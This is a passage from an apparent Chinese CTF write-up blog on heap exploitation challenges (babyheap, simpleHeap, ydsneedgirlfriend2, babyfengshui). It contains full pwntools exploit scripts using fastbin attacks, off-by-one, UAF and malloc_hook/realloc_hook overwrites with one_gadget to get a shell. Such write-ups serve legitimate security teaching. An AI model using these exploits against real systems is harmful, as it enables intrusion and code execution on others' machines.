class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;0x7efcea106b78-0x7efce9d42000&#x3D;0x3c4b78</span><br></pre></td></tr></table></figure><p>这样就算出偏移了</p><p>2.<strong>malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写</strong> malloc_hook 来 getshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;void *(*hook) (size_t, const void *)</span><br><span class="line">  &#x3D; atomic_forced_read (__malloc_hook);</span><br><span class="line">if (__builtin_expect (hook !&#x3D; NULL, 0))</span><br><span class="line">  return (*hook)(bytes, RETURN_ADDRESS (0));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;pwndbg&gt; x&#x2F;32gx (long long)(&amp;main_arena)-0x40</span><br><span class="line">&gt;0x7f92af6c2ae0 &lt;_IO_wide_data_0+288&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2af0 &lt;_IO_wide_data_0+304&gt;:0x00007f92af6c12600x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b00 &lt;__memalign_hook&gt;:0x00007f92af383ea00x00007f92af383a70</span><br><span class="line">&gt;0x7f92af6c2b10 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b20 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b30 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b40 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b50 &lt;main_arena+48&gt;:0x00005594c5a610800x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">&gt;0x7f92af6c2b70 &lt;main_arena+80&gt;:0x00000000000000000x00005594c5a611a0</span><br><span class="line">&gt;0x7f92af6c2b80 &lt;main_arena+96&gt;:0x00005594c5a610f00x00005594c5a610f0</span><br><span class="line">&gt;0x7f92af6c2b90 &lt;main_arena+112&gt;:0x00005594c5a610f00x00007f92af6c2b88</span><br><span class="line">&gt;0x7f92af6c2ba0 &lt;main_arena+128&gt;:0x00007f92af6c2b880x00007f92af6c2b98</span><br><span class="line">&gt;0x7f92af6c2bb0 &lt;main_arena+144&gt;:0x00007f92af6c2b980x00007f92af6c2ba8</span><br><span class="line">&gt;0x7f92af6c2bc0 &lt;main_arena+160&gt;:0x00007f92af6c2ba80x00007f92af6c2bb8</span><br><span class="line">&gt;0x7f92af6c2bd0 &lt;main_arena+176&gt;:0x00007f92af6c2bb80x00007f92af6c2bc8</span><br></pre></td></tr></table></figure><p>在上面我们已经泄露了libc基址，下面就是覆盖malloc_hook</p><p>首先肯定是fastbin attack，将fd指针指向malloc_hook的附近地址，这里选择了有7f的地方，因为7f&gt;71所以可以被伪造，之后就是计算偏移，将one_gadget写入堆块中，直接调用就可以</p><p>下面是成功写入one_gadget的截图</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224145651167.png" alt="image-20210224145651167"></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",26260)</span></span><br><span class="line">p = process(<span class="string">"./pwn23"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">ru(<span class="string">'Command: '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Size: '</span>)</span><br><span class="line">sl(str(size))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">ru(<span class="string">'Command: '</span>)</span><br><span class="line">sl(<span class="string">'2'</span>)</span><br><span class="line">ru(<span class="string">'Index: '</span>)</span><br><span class="line">sl(str(idx))</span><br><span class="line">ru(<span class="string">'Size: '</span>)</span><br><span class="line">sl(str(len(content)))</span><br><span class="line">ru(<span class="string">'Content: '</span>)</span><br><span class="line">s(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">ru(<span class="string">'Command: '</span>)</span><br><span class="line">sl(<span class="string">'3'</span>)</span><br><span class="line">ru(<span class="string">'Index: '</span>)</span><br><span class="line">sl(str(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">ru(<span class="string">'Command: '</span>)</span><br><span class="line">sl(<span class="string">'4'</span>)</span><br><span class="line">ru(<span class="string">'Index: '</span>)</span><br><span class="line">sl(str(idx))</span><br><span class="line">p.recvline()</span><br><span class="line"><span class="keyword">return</span> p.recvline()</span><br><span class="line"> </span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment">#防止合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line">allocate(<span class="number">255</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="V-amp-N2020-公开赛-simpleHeap-realloc-onegadget"><a href="#V-amp-N2020-公开赛-simpleHeap-realloc-onegadget" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap(realloc+onegadget)"></a>[V&amp;N2020 公开赛]simpleHeap(realloc+onegadget)</h2><p>四个功能的堆</p><ol><li>add</li><li>edit</li><li>show</li><li>delete</li></ol><p>add</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155042717.png" alt="image-20210224155042717"></p><p>edit</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155220384.png" alt="image-20210224155220384"></p><p>show</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155623947.png" alt="image-20210224155623947"></p><p>del</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155639109.png" alt="image-20210224155639109"></p><h3 id="漏洞点：-1"><a href="#漏洞点：-1" class="headerlink" title="漏洞点："></a>漏洞点：</h3><ol><li>很明显，这里有单字节溢出漏洞</li></ol><h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><ol><li>只有单字节溢出，可以更改chunk的size，所以第一步就是获取libc，通常就是拿unsorted bin的fd bk指针来获取。分配4块chunk，第一块用来更改后面的size，第二块直接释放进入unsorted bin中，第三块打印fd bk指针，第四块防止被合并</li><li>第二步就是写onegadget，将fastbin chunk里的fd指针指向malloc_hook伪造的chunk，然后写就行了，这里下面会说。</li></ol><h3 id="技巧：-1"><a href="#技巧：-1" class="headerlink" title="技巧："></a>技巧：</h3><ol><li>这里onegadget写入的时候是写入realloc中</li></ol><blockquote><p>先看onegadget</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225152559448.png" alt="image-20210225152559448"></p><p>我们这里用0x4526a</p><p>这里运用了malloc_hook和realloc_hook相结合，首先我们在malloc_hook中写入realloc_hook,然后再realloc_hook中写入onegadget,这样我们先执行一下，看一下效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;realloc &#x3D; libc_base + 0x846C0</span><br></pre></td></tr></table></figure><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225153626853.png" alt="image-20210225153626853"></p><p>直接运行到这里</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225154202313.png" alt="image-20210225154202313"></p><p>可以看到有3个0的地方，那么怎么是rsp+0x30移到指定位置呢？</p><p>上面realloc中已经有push可以改变栈帧，我们只需要改变程序执行位置就可以。</p><p>我们可以少几个push,因为push可以是rsp变小，那减少就会变大。</p><p>由于各个函数栈帧的变化，这个还是得多试一试。</p><p>具体函数执行顺序</p><p><strong>调用malloc函数——&gt;判断是否有malloc_hook，有则调用之——&gt;我们这里malloc_hook设置的为realloc函数+offset，程序便到此处执行——&gt;执行realloc函数时，会判断是否有realloc_hook，有则调用之——&gt;我们这里realloc_hook设置的为one_gadget，所以便会转到one_gadget处执行。</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"./libc-2.232.so"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29222</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn24",env =&#123;"LD_PRELOAD":"./libc-2.232.so"&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">ru(<span class="string">"choice: "</span>)</span><br><span class="line">sl(str(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">"size?"</span>)</span><br><span class="line">sl(str(size))</span><br><span class="line">ru(<span class="string">"content:"</span>)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">ru(<span class="string">"choice: "</span>)</span><br><span class="line">sl(str(<span class="number">2</span>))</span><br><span class="line">ru(<span class="string">"idx?"</span>)</span><br><span class="line">sl(str(idx))</span><br><span class="line">ru(<span class="string">"content:"</span>)</span><br><span class="line">sl(content)</span><br><span class="line">ru(<span class="string">"Done!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">ru(<span class="string">"choice: "</span>)</span><br><span class="line">sl(str(<span class="number">3</span>))</span><br><span class="line">ru(<span class="string">"idx?"</span>)</span><br><span class="line">sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">ru(<span class="string">"choice: "</span>)</span><br><span class="line">sl(str(<span class="number">4</span>))</span><br><span class="line">ru(<span class="string">"idx?"</span>)</span><br><span class="line">sl(str(idx))</span><br><span class="line">ru(<span class="string">"Done!"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'\n'</span>) <span class="comment">#0</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'\n'</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x28</span> + <span class="string">'\xE1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">leak(<span class="string">"malloc_hook"</span>,malloc_hook)</span><br><span class="line">realloc = libc_base + <span class="number">0x846CC</span>    <span class="comment">#本地与远程区别主要在这里</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526A</span></span><br><span class="line">leak(<span class="string">"realloc"</span>,realloc)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>) <span class="comment">#4 -&gt;2</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-8</span>) + p64(one_gadget)+p64(realloc))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">'size?'</span>,<span class="string">'32'</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h2><p>UAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn3.9"</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",25561)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(<span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(<span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(<span class="string">"3"</span>)</span><br><span class="line">    ru(<span class="string">":"</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0400D86</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"AAAA"</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b'A'</span>*<span class="number">0x8</span>+p64(magic))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>四个功能的堆</p><ol><li>增</li><li>删</li><li>改</li><li>查</li></ol><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194459201.png" alt="image-20210304194459201"></p><blockquote><p>增</p></blockquote><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194521206.png" alt="image-20210304194521206"></p><blockquote><p>删</p></blockquote><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194556700.png" alt="image-20210304194556700"></p><blockquote><p>改</p></blockquote><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304194612347.png" alt="image-20210304194612347"></p><blockquote><p>查</p></blockquote><p>主要堆结构</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210304202014812.png" alt="image-20210304202014812"></p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ol><li><p>这里判断条件有问题</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305092048534.png" alt="image-20210305092048534"></p></li></ol><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305094604106.png" alt="image-20210305094604106"></p><p>可以看上面两张图片，如果第一个堆块和第二个堆块相隔较远，那么我们就可以中间任意字节溢出</p><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><ol><li>我们知道每创建一个用户就会分配两个堆块，想泄露基地址这里主要用打印函数，可以打印对应地址上的内容。所以我们只需要申请几个堆块，并把0x80这种堆块中指向size的指针改为got表上任意一个值即可泄露。</li><li>那么第二个问题是怎么任意字节溢出，这里主要用到unsorted bin合并。如果两个堆块释放，合并，再分配（分配大小正好等于size堆块和0x80堆块之和），之后的0x80就放在了最后面。意味着我们可以中间任意字节溢出。</li></ol><h3 id="技巧：-2"><a href="#技巧：-2" class="headerlink" title="技巧："></a>技巧：</h3><ol><li>灵活利用堆指针</li><li>改got表</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 